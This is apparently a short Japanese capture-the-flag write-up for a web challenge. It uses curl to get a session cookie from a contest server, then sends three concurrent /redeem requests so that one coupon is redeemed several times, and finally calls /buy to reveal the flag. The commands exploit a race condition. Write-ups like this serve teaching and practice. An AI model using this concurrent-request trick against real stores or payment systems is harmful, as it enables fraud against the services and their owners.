まず以下のコマンドでsidを取得する。

```bash
$ curl -c cookie.txt http://34.170.146.252:13561/
$ cat cookie.txt
```

そして、以下のコマンドを同時に実行する。これによって、クーポンを複数回使用することができ、残高を30にできる。

```bash
$ curl -b cookie.txt http://34.170.146.252:13561/redeem & curl -b cookie.txt http://34.170.146.252:13561/redeem & curl -b cookie.txt http://34.170.146.252:13561/redeem &
```

そのあと以下を実行すると、FLAGが表示される。

```bash
$ curl -b cookie.txt http://34.170.146.252:13561/buy
```